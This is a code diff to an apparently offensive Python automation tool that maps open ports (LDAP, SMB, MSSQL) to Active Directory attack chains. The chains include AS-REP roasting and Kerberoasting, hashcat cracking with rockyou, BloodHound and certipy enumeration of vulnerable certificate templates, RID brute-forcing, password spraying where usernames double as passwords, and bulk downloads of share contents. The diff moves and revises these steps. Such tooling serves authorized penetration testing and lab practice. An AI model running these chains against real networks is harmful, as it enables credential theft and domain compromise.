@@ -133,9 +133,9 @@ def ldap_tasks(context):
     target = context.get_target()
     if context.creds_exist():
         user, passwd = context.get_initial_cred()
-        run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" bloodyAD --host {target} -d {context.domain} -u {user} -p '{passwd}' -k get writable; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc ldap {context.ip} -u {user} -p '{passwd}' -k --asreproast hashes.asreproast --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc ldap {context.ip} -u {user} -p '{passwd}' -k -M maq -M sccm -M laps -M adcs -M pre2k; echo; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet; bloodhound.py --zip -c All -d {context.domain} -dc {target} -ns {context.ip} -u {user} -p '{passwd}'")
-        run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" certipy find -u {user}@{context.domain} -p '{passwd}' -k -target {target} -dc-ip {context.ip} -stdout -timeout 2 -enabled; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" certipy find -u {user}@{context.domain} -p '{passwd}' -k -target {target} -dc-ip {context.ip} -stdout -timeout 2 -vulnerable; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" powerview {context.domain}/{user}:'{passwd}'@{target} -k --web")
-        run_task(context, "neo4j start; sleep 5; bloodhound &> /dev/null & disown")
+        run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" bloodyAD --host {target} -d {context.domain} -u {user} -p '{passwd}' -k get writable; echo; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc ldap {context.ip} -u {user} -p '{passwd}' -k --asreproast hashes.asreproast --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc ldap {context.ip} -u {user} -p '{passwd}' -k -M maq -M sccm -M laps -M adcs -M pre2k; echo; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet; bloodhound.py --zip -c All -d {context.domain} -dc {target} -ns {context.ip} -u {user} -p '{passwd}'")
+        run_task(context, f"rm -f $(pwd)/initial_enabled_Certipy.json; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" certipy find -u {user}@{context.domain} -p '{passwd}' -k -target {target} -dc-ip {context.ip} -stdout -json -output initial_enabled -timeout 2 -enabled; echo -e '\n<--- Find Vulnerable: --->\n'; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" certipy find -u {user}@{context.domain} -p '{passwd}' -k -target {target} -dc-ip {context.ip} -stdout -json -timeout 2 -vulnerable; echo; parse_certipy.py initial_enabled_Certipy.json; echo; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" powerview {context.domain}/{user}:'{passwd}'@{target} -k --web")
+        run_task(context, "neo4j start; sleep 10; bloodhound &> /dev/null & disown")
     else:
         if anonymous_bind(context):
             write_log(context.log_file, f"LDAP anonymous bind is enabled", "SUCCESS")
@@ -151,6 +151,8 @@ def proto_tasks(context):
 
 @port_registry.register_port_handler(445)
 def smb_tasks(context):
+    target = context.get_target()
+    shares, method = enum_smb_shares(context)
     if context.creds_exist():
         user, passwd = context.get_initial_cred()
         run_task(context, f"aliasr scan {context.ip} -u {user} -p '{passwd}'")
@@ -159,26 +161,31 @@ def smb_tasks(context):
     else:
         run_task(context, f"aliasr scan {context.ip}")
         run_task(context, f"rm -f $(pwd)/smb.out; nxc smb {context.ip} -u '' -p '' --shares --users --pass-pol --rid-brute 10000 --log $(pwd)/smb.out; nxc smb {context.ip} -u 'a' -p '' --rid-brute 10000 --log $(pwd)/smb.out; cat smb.out | grep TypeUser | cut -d '\\' -f 2 | cut -d ' ' -f 1 > users.txt; echo; cat users.txt; echo; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u users.txt -p users.txt -k --no-bruteforce --continue-on-success; nxc smb {context.ip} -u users.txt -p '' --continue-on-success")
-    shares, method = enum_smb_shares(context)
     if shares:
         for share in shares:
             if share['name'] not in ['ADMIN$', 'C$', 'Users', 'IPC$', 'NETLOGON', 'SYSVOL']:
                 write_log(context.log_file, f"Found non-default share: {share['name']} ({', '.join(share['access'])} privileges)", "SUCCESS")
                 if method == 'user/pass':
-                    run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u {user} -p '{passwd}' -k --spider '{share['name']}' --regex . --depth 2; nxc smb {context.ip} -u {user} -p '{passwd}' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.; cat {context.ip}.json | jq '. | map_values(keys)'")
+                    run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u {user} -p '{passwd}' -k --spider '{share['name']}' --regex . --depth 2")
                 elif method == 'null':
-                    run_task(context, f"nxc smb {context.ip} -u '' -p '' --spider '{share['name']}' --regex . --depth 2; nxc smb {context.ip} -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.; cat {context.ip}.json | jq '. | map_values(keys)'; smbclientng --host {context.ip} -d {context.domain} -u a -p ''")
+                    run_task(context, f"nxc smb {context.ip} -u '' -p '' --spider '{share['name']}' --regex . --depth 2")
                 elif method == 'guest':
-                    run_task(context, f"nxc smb {context.ip} -u 'a' -p '' --spider '{share['name']}' --regex . --depth 2; nxc smb {context.ip} -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.; cat {context.ip}.json | jq '. | map_values(keys)'; smbclientng --host {context.ip} -d {context.domain} -u a -p ''")
+                    run_task(context, f"nxc smb {context.ip} -u 'a' -p '' --spider '{share['name']}' --regex . --depth 2")
             if 'WRITE' in share['access']:
                 write_log(context.log_file, f"Found writeable share: {share['name']} ({', '.join(share['access'])} privileges)", "SUCCESS")
+        if method == 'user/pass':
+            run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u {user} -p '{passwd}' -k -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.; cat {context.ip}.json | jq '. | map_values(keys)'; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" smbclientng --host {target} -d {context.domain} -u {user} -p '{passwd}' -k -C shares")
+        elif method == 'null':
+            run_task(context, f"nxc smb {context.ip} -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.; cat {context.ip}.json | jq '. | map_values(keys)'; smbclientng --host {context.ip} -d {context.domain} -u '' -p '' -C shares")
+        elif method == 'guest':
+            run_task(context, f"nxc smb {context.ip} -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.; cat {context.ip}.json | jq '. | map_values(keys)'; smbclientng --host {context.ip} -d {context.domain} -u a -p '' -C shares")
 
 
 @port_registry.register_port_handler(1433)
 def proto_tasks(context):
     if context.creds_exist():
         user, passwd = context.get_initial_cred()
-        run_task(context, f"nxc mssql {context.ip} -u {user} -p '{passwd}' -M enum_impersonate -M enum_links -M enum_logins; nxc mssql {context.ip} -u {user} -p '{passwd}' --local-auth -M enum_impersonate -M enum_links -M enum_logins; nxc mssql {context.ip} -u {user} -p '{passwd}' -d . -M enum_impersonate -M enum_links -M enum_logins")
+        run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc mssql {context.ip} -u {user} -p '{passwd}' -k -M enum_impersonate -M enum_links -M enum_logins; nxc mssql {context.ip} -u {user} -p '{passwd}' --local-auth -M enum_impersonate -M enum_links -M enum_logins; nxc mssql {context.ip} -u {user} -p '{passwd}' -d . -M enum_impersonate -M enum_links -M enum_logins")
         run_task(context, f"mssqlclient.py {context.domain}/{user}:'{passwd}'@{context.ip}")
         run_task(context, f"mssqlclient.py {context.domain}/{user}:'{passwd}'@{context.ip} -windows-auth")
 
